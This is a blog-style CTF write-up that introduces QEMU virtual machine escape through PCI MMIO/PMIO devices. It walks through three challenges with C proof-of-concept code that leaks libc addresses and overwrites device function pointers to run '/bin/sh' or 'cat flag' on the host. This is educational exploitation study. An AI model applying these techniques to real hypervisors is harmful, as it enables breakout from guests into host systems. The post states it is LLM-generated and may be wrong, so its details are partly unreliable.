---
title: '[VMPwn] 老头初探 QEMU 逃逸'
description: '"我为什么不会虚拟机逃逸？" 走在路上突然想起这个事情，突然想起前人曾经说过的一句话："不会虚拟机逃逸的人是失败的"。'
pubDate: 2025-05-06
updatedDate: 2025-05-12
authors:
- nova

---
"Why can’t I do a VM escape?" I suddenly wondered while walking down the street—recalling the old saying: "Anyone who can’t escape a virtual machine is doomed to fail."

There are many types of VM escapes. Today, let’s tackle the most classic PWN: QEMU escape.

{/* truncate */}

## Prerequisites

Putting reality aside, let’s see what a typical CTF challenge looks like.

Just as a user-mode PWN challenge provides a vulnerable user-mode program, a kernel PWN challenge gives a vulnerable kernel component (often a driver). A VM PWN challenge naturally needs a VM-exposed target.

In user PWN, you typically exploit an RCE or arbitrary file read. Kernel PWN yields local privilege escalation (LPE) or arbitrary kernel read/write. For QEMU PWN, you’re usually given a vulnerable PCI device (compiled into the `qemu-system-x86_64` binary) and must use it to access host memory or execute commands from within the guest.

### What Is a PCI Device?

Simply put, any device conforming to the Peripheral Component Interconnect (PCI) standard. These devices attach to the motherboard’s PCI bus—common examples include network cards, sound cards, and GPUs.

Why does this matter? For real hardware, PCI devices expose a configuration space recording their class, vendor, device IDs, and other details. We rely on this to identify our target, but in QEMU we are simulating a PCI device.

```bash
> lspci
2f79:00:00.0 3D controller: Microsoft Corporation Basic Render Driver
50eb:00:00.0 System peripheral: Red Hat, Inc. Virtio file system (rev 01)
... 
```

The format `bus:device.function` identifies each device. With `sudo lspci -v -x` you can also dump raw config space bytes.

### Massaging the Fields

Take `00:05.0 Class 00ff: 1234:dead` as an example:

- `00` is the bus number.
- `05.0` means device number 5, function 0.
- `00ff` is the class code.
- `1234` is the vendor ID.
- `dead` is the device ID.

After the 16th byte in the PCI config header come Base Address Registers (BARs), which tell you the device’s required memory or I/O port ranges. If the least significant bit of a BAR is 0, it’s memory-mapped I/O (MMIO); if it’s 1, it’s port-mapped I/O (PMIO).

#### MMIO

For MMIO bars, bits determine address size (32/64-bit), prefetchability, and region size. The kernel driver can ioremap MMIO into guest memory, then read/write via normal loads and stores.

Linux kernel code example:

```c
#include <linux/io.h>
void __iomem *addr;

if (!request_mem_region(ioaddr, size, "my_device")) return -EBUSY;
addr = ioremap(ioaddr, size);
uint32_t val = readl(addr);
writel(val + 1, addr);
iounmap(addr);
release_mem_region(ioaddr, size);
```

User-mode example:

```c
int fd = open("/sys/devices/.../resource0", O_RDWR | O_SYNC);
void *mmio = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
uint32_t val = *(volatile uint32_t *)(mmio + offset);
*(volatile uint32_t *)(mmio + offset) = val + 1;
``` 

#### PMIO

Port-mapped I/O uses separate CPU instructions (`inl`/`outl`) and a distinct I/O address space. You must elevate I/O privileges (e.g. `iopl(3)` or `ioperm`).

```c
#include <sys/io.h>
if (iopl(3) < 0) die("iopl failed");
outl(value, port);
value = inl(port);
```

## Stage 0: Recon & PoC — VNCTF2023 / escape_langlang_mountain

> Download: https://pan.baidu.com/s/1uzVQqcwx3Qp0hb2_JL-_Eg (code: muco)
> https://buuoj.cn/match/matches/179/challenges#escape_langlang_mountain

The challenge environment runs QEMU with a custom `vn` PCI device. Read the `launch.sh` script:

```bash
./qemu-system-x86_64 \
  -m 64M --nographic \
  -kernel vmlinuz-5.0.5-generic \
  -initrd rootfs.cpio \
  ... -device vn,id=vda
```

The `vn` device is our vulnerability. Since symbols are stripped, start with `strings` and search for `vn_`. You’ll find the init routine registering a `PCIDeviceClass` with function pointers for `realize`, `exit`, etc.

In the `realize` callback, QEMU does `memory_region_init_io(&pdev->mmio, ..., &hitb_mmio_ops, pdev, "hitb-mmio", 0x100000); pci_register_bar(...);`. From the `hitb_mmio_ops` structure, extract the `read` and `write` handlers.

The `read` handler dispatches on `(addr >> 20) & 0xf` and `(addr >> 16) & 0xf` to leak pointers. The `write` handler, triggered by two specific offsets, ends up calling `system("cat flag")`.

### PoC Code

Use MMIO to open resource0, mmap it, then perform two writes to trigger the escape:

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>

volatile uint8_t *mmio;
void die(const char *s) { perror(s); exit(1); }
int main() {
  int fd = open("/sys/devices/.../resource0", O_RDWR|O_SYNC);
  if (fd < 0) die("open");
  mmio = mmap(NULL, 0x100000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
  if (mmio == MAP_FAILED) die("mmap");
  mmio[0x100] = 1;  // first trigger
  mmio[0x200] = 1;  // second trigger
  return 0;
}
```

Upload via a base64 pipeline in the guest, then run `./exp` to get the flag.

## Stage 1: Simple OOB — CCB2025 / ccb-dev

> (Internal CCB repo, ask me if you need it)

This offline challenge uses a `ccb-dev-pci` device. Inspect `run.sh`, load the binary into IDA, and locate the `ccb` class initialization and its `realize` method.

Inside the MMIO ops, you’ll find an out-of-bounds read/write on the `state->regs` array and a user-settable `log_handler` pointer. Simply overwrite `log_handler` with `system`, set `log_fd` or `log_arg` to your command (e.g. "/bin/sh" or "cat flag"), then trigger the logging call.

### PoC Sketch

1. Attach with GDB to the QEMU process in privileged Docker (LD_LIBRARY_PATH hack to load qemu libs).
2. Read the `log_handler` pointer offset by 0x11 via MMIO.
3. Calculate `libc_base`, find `system` and `"/bin/sh"`.
4. Write `system` back into `log_handler`, write your command string into the regs, then perform the log call.

## Stage 2: Simple OOB with PMIO — Blizzard CTF 2017 / STRNG

> https://github.com/rcvalle/blizzardctf2017

This challenge presents a `STRNG` PCI device. In IDA with symbols, locate `pci_strng_realize` registering both MMIO (256-byte window) and PMIO ops.

The 256-byte MMIO perimeter prevents a large out-of-bounds access, so we use PMIO. The handlers index `state->regs[offset>>2]` directly without bounds checks.

Workflow:
1. `iopl(3)` in user space.
2. PMIO write to offset `(65<<2)`, then PMIO read to leak `srand` pointer.
3. Leak high bits similarly, compute `libc_base`, `system`, `/bin/sh` addresses.
4. Map MMIO to write `/bin/sh` into `state->regs[2..3]`.
5. Use PMIO to overwrite the `rand_r` function pointer, passing `&regs[2]`, then trigger it to call `system("cat flag")`.

### PoC Sketch
```c
#include <sys/io.h>
#include <sys/mman.h>
...
int main() {
  if (iopl(3) < 0) die("iopl");
  // leak srand
  outl(65<<2, base_port);
  uint32_t low = inl(base_port+4);
  // leak high bits
  outl(66<<2, base_port);
  uint32_t high = inl(base_port+4);
  uint64_t srand_addr = ((uint64_t)high<<32)|low;
  ... // compute libc_base, system, binsh
  // write function pointers via PMIO
  outl(69<<2, base_port);
  outl(system & 0xffffffff, base_port+4);
  outl(70<<2, base_port);
  outl(system>>32, base_port+4);
  // write "/bin/sh" via MMIO regs
  volatile uint8_t *mmio = mmap(...);
  *(uint32_t*)(mmio + 2*4) = *(uint32_t*)"/bin";
  *(uint32_t*)(mmio + 3*4) = *(uint32_t*)"/sh\0\0";
  // trigger rand_r override
  outl(71<<2, base_port);
  return 0;
}
```

## References

- Virtual Machine Escape Primer (in Chinese) by l0tus
- QEMU Escape Introduction by S1nec-1o

:::info
This Content is generated by LLM and might be wrong / incomplete, refer to Chinese version if you find something wrong.
:::

{/* AI */}
